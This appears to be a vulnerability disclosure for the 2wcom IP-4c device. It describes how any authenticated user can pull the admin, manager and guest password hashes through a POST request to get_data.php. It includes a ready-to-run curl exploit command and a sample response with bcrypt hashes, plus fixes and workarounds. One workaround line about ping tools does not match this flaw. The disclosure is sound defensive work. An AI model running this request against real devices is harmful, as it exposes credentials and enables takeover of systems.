# 2wcom IP-4c Vulnerability Disclosure: Information Disclosure

## 📝 Description

The 2wcom IP-4c device’s web interface includes an **information disclosure vulnerability**.  
By sending a crafted POST request to a specific endpoint (`/cwi/ajax_request/get_data.php`),  
an **authenticated attacker** (even with a low-privileged account like `guest`) can retrieve the  
**hashed passwords for the admin, manager, and guest accounts**.

This significantly weakens the system’s security posture, as these hashes could be cracked offline,  
granting attackers administrative access to the device.

---

## Vendor Information

- **Vendor**: 2wcom  
- **Vendor Homepage**: https://www.2wcom.com/

## 🎯 Affected Product

**Device:** 2wcom IP-4c  
**Firmware/Software Bundle:** 2.15.5  
**File/Recovery System:** 2.78 / 2.02  
**App Version:** 2.15.16  
**Webinterface:** 3.54  
**FPGA:** 1.12b64 / 0  
**System Controller:** 1.07  
**SNMP MIB:** 4.4  
**Kernel:** 2wcom-01.25-rt60  
**Codecs:** MP2, MP3, AAC, xHE-AAC, Opus, E-aptX  
**HW Revision XPS/IF:** 1.02 / 1.10  

---

## ⚠️ Vulnerability Overview

**Type:** Information Disclosure  
**Impact:** Leaks admin and manager **hashed passwords** to any authenticated user (including guest).

---

## 🔓 Vulnerable Endpoint

```
/cwi/ajax_request/get_data.php
```

---

## 🛠️ Exploitation Steps

1. Authenticate as any user (including guest).
2. Send a **POST** request to `/cwi/ajax_request/get_data.php` with the following parameters:

```http
request_1=csl-device-sysSettings-adminUser
request_2=csl-device-sysSettings-adminPw
request_3=csl-device-sysSettings-managerUser
request_4=csl-device-sysSettings-managerPw
request_5=csl-device-sysSettings-guestUser
request_6=csl-device-sysSettings-guestPw
```
## 💡 Example Exploit Command
```bash
curl 'http://<TARGET_IP>/cwi/ajax_request/get_data.php' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Cache-Control: no-cache' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'Cookie: PHPSESSID=<VALID_SESSION>; IP-4c_ovD=1; IP-4c_sIP=2; IP-4c_userTab=1' \
  -H 'Origin: http://<TARGET_IP>' \
  -H 'Pragma: no-cache' \
  -H 'Referer: http://<TARGET_IP>/' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --data-raw 'request_1=csl-device-sysSettings-adminUser&request_2=csl-device-sysSettings-adminPw&request_3=csl-device-sysSettings-managerUser&request_4=csl-device-sysSettings-managerPw&request_5=csl-device-sysSettings-guestUser&request_6=csl-device-sysSettings-guestPw'
```
## 📥 Example Response
```json
{
  "get:csl.device.sysSettings:adminUser": "admin",
  "get:csl.device.sysSettings:managerUser": "manager",
  "get:csl.device.sysSettings:guestPw": "$2a$10$FvVelC3AeH5E.gayp3woieIIHYzn42hi4TY7IEkje3x8Z3nhTuA0S",
  "get:csl.device.sysSettings:guestUser": "user",
  "get:csl.device.sysSettings:adminPw": "$2a$10$nnqA0u5chKUFS50zeByoD.D66mt4q6DNgJDUc7hwHlY7r3AQjVBEq",
  "get:csl.device.sysSettings:managerPw": "$2a$10$#3mMw5OlNhZ.uPc2XU#3ijQ.2ba2xd2f9TsoIYo1iK5BypO3Q8aRotC"
}
```
---

## Proof of Concept (PoC) for(RCE,Information Disclosure,Broken Access Control)
https://github.com/user-attachments/assets/42bc93b9-cc75-47bf-bae4-e33f6f87a3ce

---

## Impact

    * Hashed admin and manager passwords are exposed.

    * Attackers can crack the hashes offline to gain full administrative control.

---

##  Suggested Fixes

    * Update firmware to the latest version (if available).

    * Restrict access to the web interface to trusted IPs.

    * Use strong, unique passwords for admin and manager accounts.

    * Regularly monitor system access logs for suspicious requests.

---

## Workarounds

  * Restrict access to /cwi/ajax_request/* endpoints using firewall rules or VPN

  * Monitor system logs for suspicious ping tool usage
